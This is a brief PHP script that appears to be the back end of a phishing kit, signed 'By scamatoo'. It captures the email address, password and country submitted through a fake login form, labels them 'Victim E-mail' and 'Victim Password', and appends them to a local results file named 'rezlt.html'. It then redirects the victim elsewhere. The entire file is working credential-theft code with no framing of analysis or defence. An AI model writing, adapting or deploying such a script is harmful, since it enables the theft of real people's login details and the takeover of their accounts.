<?php



$message .= "<center><h2><font color='red'/>By scamatoo</font></h2>";
$message .= "<h3><font color='black'/>Victim E-mail:</font><font color='green'/> ".$_POST['email']."</font></h3>";
$message .= "<h3><font color='black'/>Victim Password:</font><font color='green'/> ".$_POST['pass']."</font></h3>";
$message .= "<h3><font color='black'/>Victim Country:</font><font color='green'/> ".$_POST['country']."</font></h3>";
$message .= "<font color='red'/>---------------------------------</font>";

$file = fopen("rezlt.html","ab");
fwrite($file,$message);
fclose($file);


header("Location: redirect.php");



?>